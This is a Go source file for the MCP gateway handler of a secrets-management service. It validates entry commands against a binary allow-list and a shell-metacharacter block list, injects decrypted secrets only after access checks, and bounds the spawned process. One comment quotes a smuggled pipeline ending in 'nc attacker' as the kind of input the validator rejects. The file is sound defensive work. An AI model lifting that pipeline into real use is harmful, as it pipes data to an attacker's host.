package api

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/santapong/KeepSave/backend/internal/crypto"
	"github.com/santapong/KeepSave/backend/internal/models"
	"github.com/santapong/KeepSave/backend/internal/repository"
	"github.com/santapong/KeepSave/backend/internal/service"
)

// allowedMCPBinaries lists the executables an operator can register as a
// MCP server entry command. Per ADR-0010, user input MUST NOT reach a shell
// interpreter; any binary outside this list is rejected before exec.
var allowedMCPBinaries = map[string]struct{}{
	"node":    {},
	"python":  {},
	"python3": {},
}

// shellMetaChars contains characters that imply shell evaluation. Their
// presence in any entry-command token rejects the registration even if the
// first token is in the allow-list - they suggest the operator is trying
// to smuggle a shell pipeline (e.g. "node -e require('fs')...|nc attacker").
const shellMetaChars = ";|&$`\n\r<>(){}\\\"'*?~!"

// mcpExecTimeout bounds how long a single tool call may run. The 30s window
// matches the SDK's default; the process group is killed on timeout (see
// SysProcAttr below).
const mcpExecTimeout = 30 * time.Second

// maxMCPOutput caps a single tool call's stdout so a runaway or malicious MCP
// server cannot exhaust the API process's memory (ADR-0010 part B).
const maxMCPOutput = 4 << 20 // 4 MiB

// validateMCPEntryCommand parses and vets a server.EntryCommand string. It
// returns the argv slice if safe, or a typed error otherwise. The validation
// is intentionally strict: an allowed binary name with no path separators,
// no shell metachars in any token.
func validateMCPEntryCommand(entry string) ([]string, error) {
	parts := strings.Fields(entry)
	if len(parts) == 0 {
		return nil, fmt.Errorf("no entry command configured")
	}
	bin := parts[0]
	if strings.ContainsAny(bin, "/\\") {
		return nil, fmt.Errorf("entry binary must not contain path separators")
	}
	if _, ok := allowedMCPBinaries[bin]; !ok {
		return nil, fmt.Errorf("entry binary %q is not in the MCP allow-list", bin)
	}
	for _, tok := range parts {
		if strings.ContainsAny(tok, shellMetaChars) {
			return nil, fmt.Errorf("entry command contains shell metacharacter")
		}
	}
	return parts, nil
}

type MCPGatewayHandler struct {
	mcpService     *service.MCPService
	builderService *service.MCPBuilderService
	mcpRepo        *repository.MCPRepository
	secretRepo     *repository.SecretRepository
	projectRepo    *repository.ProjectRepository
	envRepo        *repository.EnvironmentRepository
	cryptoSvc      *crypto.Service
}

func NewMCPGatewayHandler(
	mcpService *service.MCPService,
	builderService *service.MCPBuilderService,
	mcpRepo *repository.MCPRepository,
	secretRepo *repository.SecretRepository,
	projectRepo *repository.ProjectRepository,
	envRepo *repository.EnvironmentRepository,
	cryptoSvc *crypto.Service,
) *MCPGatewayHandler {
	return &MCPGatewayHandler{
		mcpService:     mcpService,
		builderService: builderService,
		mcpRepo:        mcpRepo,
		secretRepo:     secretRepo,
		projectRepo:    projectRepo,
		envRepo:        envRepo,
		cryptoSvc:      cryptoSvc,
	}
}

// HandleToolCall proxies an MCP tool call to the appropriate MCP server.
func (h *MCPGatewayHandler) HandleToolCall(c *gin.Context) {
	userID, authedOK := getUserID(c)
	if !authedOK {
		return
	}

	var req models.MCPGatewayRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusOK, models.MCPGatewayResponse{
			JSONRPC: "2.0",
			ID:      req.ID,
			Error:   &models.MCPError{Code: -32700, Message: "parse error"},
		})
		return
	}

	if req.Method != "tools/call" {
		c.JSON(http.StatusOK, models.MCPGatewayResponse{
			JSONRPC: "2.0",
			ID:      req.ID,
			Error:   &models.MCPError{Code: -32601, Message: "method not found"},
		})
		return
	}

	toolName, _ := req.Params["name"].(string)
	toolArgs, _ := req.Params["arguments"].(map[string]interface{})

	if toolName == "" {
		c.JSON(http.StatusOK, models.MCPGatewayResponse{
			JSONRPC: "2.0",
			ID:      req.ID,
			Error:   &models.MCPError{Code: -32602, Message: "tool name required"},
		})
		return
	}

	// Find which server handles this tool
	serversWithTools, err := h.mcpService.ListUserTools(userID)
	if err != nil {
		c.JSON(http.StatusOK, models.MCPGatewayResponse{
			JSONRPC: "2.0",
			ID:      req.ID,
			Error:   &models.MCPError{Code: -32603, Message: "internal error"},
		})
		return
	}

	var targetServer *models.MCPServerWithTools
	for i, swt := range serversWithTools {
		for _, tool := range swt.Tools {
			if tool.Name == toolName {
				targetServer = &serversWithTools[i]
				break
			}
		}
		if targetServer != nil {
			break
		}
	}

	if targetServer == nil {
		c.JSON(http.StatusOK, models.MCPGatewayResponse{
			JSONRPC: "2.0",
			ID:      req.ID,
			Error:   &models.MCPError{Code: -32601, Message: fmt.Sprintf("tool '%s' not found in any installed server", toolName)},
		})
		return
	}

	// Inject secrets as environment variables
	envVars, err := h.resolveSecretEnvVars(targetServer, userID)
	if err != nil {
		c.JSON(http.StatusOK, models.MCPGatewayResponse{
			JSONRPC: "2.0",
			ID:      req.ID,
			Error:   &models.MCPError{Code: -32603, Message: "failed to resolve secrets"},
		})
		return
	}

	// Execute the tool call via the MCP server
	start := time.Now()
	result, err := h.executeMCPToolCall(targetServer, toolName, toolArgs, envVars)
	duration := time.Since(start)

	// Log the gateway request
	status := "success"
	if err != nil {
		status = "error"
	}
	h.mcpService.LogGatewayRequest(&models.MCPGatewayLog{
		UserID:         &userID,
		MCPServerID:    &targetServer.ID,
		ToolName:       toolName,
		RequestPayload: models.JSONMap{"arguments": toolArgs},
		ResponseStatus: status,
		DurationMs:     int(duration.Milliseconds()),
	})

	if err != nil {
		c.JSON(http.StatusOK, models.MCPGatewayResponse{
			JSONRPC: "2.0",
			ID:      req.ID,
			Error:   &models.MCPError{Code: -32603, Message: err.Error()},
		})
		return
	}

	c.JSON(http.StatusOK, models.MCPGatewayResponse{
		JSONRPC: "2.0",
		ID:      req.ID,
		Result:  result,
	})
}

// ListTools returns all available tools across installed MCP servers.
func (h *MCPGatewayHandler) ListTools(c *gin.Context) {
	userID, authedOK := getUserID(c)
	if !authedOK {
		return
	}

	serversWithTools, err := h.mcpService.ListUserTools(userID)
	if err != nil {
		c.JSON(http.StatusOK, models.MCPGatewayResponse{
			JSONRPC: "2.0",
			Error:   &models.MCPError{Code: -32603, Message: "internal error"},
		})
		return
	}

	var allTools []map[string]interface{}
	for _, swt := range serversWithTools {
		for _, tool := range swt.Tools {
			allTools = append(allTools, map[string]interface{}{
				"name":        tool.Name,
				"description": tool.Description,
				"inputSchema": tool.InputSchema,
				"server_id":   swt.ID.String(),
				"server_name": swt.Name,
			})
		}
	}

	c.JSON(http.StatusOK, models.MCPGatewayResponse{
		JSONRPC: "2.0",
		Result: map[string]interface{}{
			"tools": allTools,
		},
	})
}

// MCPConfig generates the MCP configuration JSON for the user.
func (h *MCPGatewayHandler) MCPConfig(c *gin.Context) {
	userID, authedOK := getUserID(c)
	if !authedOK {
		return
	}

	installations, err := h.mcpService.ListInstallations(userID)
	if err != nil {
		WrapError(c, err)
		return
	}

	baseURL := c.Request.Host
	scheme := "https"
	if c.Request.TLS == nil {
		scheme = "http"
	}

	mcpServers := map[string]interface{}{}

	// Gateway server (unified endpoint)
	mcpServers["keepsave-gateway"] = map[string]interface{}{
		"command": "npx",
		"args":    []string{"-y", "@keepsave/mcp-client", "--gateway", fmt.Sprintf("%s://%s/api/v1/mcp/gateway", scheme, baseURL)},
	}

	// Individual server configs
	for _, inst := range installations {
		if !inst.Enabled {
			continue
		}
		server, err := h.mcpRepo.GetServer(inst.MCPServerID)
		if err != nil || server.Status != "ready" {
			continue
		}
		mcpServers[server.Name] = map[string]interface{}{
			"server_id":  server.ID.String(),
			"github_url": server.GitHubURL,
			"transport":  server.Transport,
			"enabled":    inst.Enabled,
		}
	}

	c.JSON(http.StatusOK, gin.H{
		"mcpServers": mcpServers,
	})
}

// Internal helpers

func (h *MCPGatewayHandler) resolveSecretEnvVars(server *models.MCPServerWithTools, userID uuid.UUID) ([]string, error) {
	var envVars []string

	if server.EnvMappings == nil {
		return envVars, nil
	}

	// EnvMappings format: {"ENV_VAR_NAME": {"project_id": "...", "environment": "...", "secret_key": "..."}}
	for envName, mappingRaw := range server.EnvMappings {
		mapping, ok := mappingRaw.(map[string]interface{})
		if !ok {
			continue
		}

		projectIDStr, _ := mapping["project_id"].(string)
		environment, _ := mapping["environment"].(string)
		secretKey, _ := mapping["secret_key"].(string)

		if projectIDStr == "" || environment == "" || secretKey == "" {
			continue
		}

		projectID, err := uuid.Parse(projectIDStr)
		if err != nil {
			continue
		}

		// Enforce that the caller may actually access this project before
		// decrypting any of its secrets. Without this, a server owner could
		// map an arbitrary project_id and exfiltrate another tenant's
		// plaintext secrets (DB-01). Skip silently — consistent with the
		// other failure branches and leaking nothing about project existence.
		allowed, err := h.projectRepo.UserHasAccess(userID, projectID)
		if err != nil || !allowed {
			log.Printf("mcp gateway: denied secret mapping env_var=%s project=%s user=%s", envName, projectID, userID)
			continue
		}

		// Get project DEK
		project, err := h.projectRepo.GetByID(projectID)
		if err != nil {
			continue
		}

		dek, err := h.cryptoSvc.DecryptDEK(project.EncryptedDEK, project.DEKNonce)
		if err != nil {
			continue
		}

		// Get environment
		env, err := h.envRepo.GetByProjectAndName(projectID, environment)
		if err != nil {
			continue
		}

		// Get secret
		secret, err := h.secretRepo.GetByEnvAndKey(env.ID, secretKey)
		if err != nil {
			continue
		}

		// Decrypt secret value
		value, err := crypto.Decrypt(dek, secret.EncryptedValue, secret.ValueNonce)
		if err != nil {
			continue
		}

		envVars = append(envVars, fmt.Sprintf("%s=%s", envName, string(value)))
	}

	return envVars, nil
}

func (h *MCPGatewayHandler) executeMCPToolCall(server *models.MCPServerWithTools, toolName string, args map[string]interface{}, envVars []string) (interface{}, error) {
	buildDir := h.builderService.GetBuildDir(server.ID)

	// Build the MCP JSON-RPC request
	mcpRequest := map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      1,
		"method":  "tools/call",
		"params": map[string]interface{}{
			"name":      toolName,
			"arguments": args,
		},
	}

	requestJSON, err := json.Marshal(mcpRequest)
	if err != nil {
		return nil, fmt.Errorf("marshaling request: %w", err)
	}

	// Validate the entry command against the allow-list before exec.
	// User-controlled DB string + os/exec is the audit S-B5 RCE vector;
	// the validator below is the trust boundary.
	parts, err := validateMCPEntryCommand(server.EntryCommand)
	if err != nil {
		return nil, err
	}

	// Bound the exec; the context cancel kills the process group on
	// timeout so a runaway tool can't burn a goroutine indefinitely.
	ctx, cancel := context.WithTimeout(context.Background(), mcpExecTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, parts[0], parts[1:]...)
	cmd.Dir = buildDir
	cmd.Stdin = strings.NewReader(string(requestJSON))

	// Inherit a minimal environment - explicitly NOT os.Environ() - and add
	// only the per-secret envVars the caller has been authorized for.
	cmd.Env = append([]string{}, envVars...)
	// Run the child in its own process group so the whole group can be killed
	// on timeout/cancel (an interpreter may fork children).
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, fmt.Errorf("opening tool output: %w", err)
	}
	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("starting tool: %w", err)
	}

	// Kill the entire process group (negative pid) on timeout/cancel, not just
	// the direct child, so forked grandchildren cannot linger.
	done := make(chan struct{})
	defer close(done)
	go func() {
		select {
		case <-ctx.Done():
			if cmd.Process != nil {
				_ = syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
			}
		case <-done:
		}
	}()

	// Read at most maxMCPOutput bytes (plus one, to detect overflow) so a
	// runaway server cannot exhaust API-process memory (ADR-0010 part B).
	output, _ := io.ReadAll(io.LimitReader(stdout, maxMCPOutput+1))
	truncated := len(output) > maxMCPOutput
	if truncated {
		output = output[:maxMCPOutput]
		// Stop the still-writing group immediately rather than waiting for the
		// timeout to fire.
		if cmd.Process != nil {
			_ = syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
		}
	}
	if err := cmd.Wait(); err != nil && !truncated {
		return nil, fmt.Errorf("executing tool: %w", err)
	}

	// Parse the MCP response
	var response map[string]interface{}
	if err := json.Unmarshal(output, &response); err != nil {
		return map[string]interface{}{
			"content": []map[string]interface{}{
				{"type": "text", "text": string(output)},
			},
		}, nil
	}

	if result, ok := response["result"]; ok {
		return result, nil
	}

	return response, nil
}
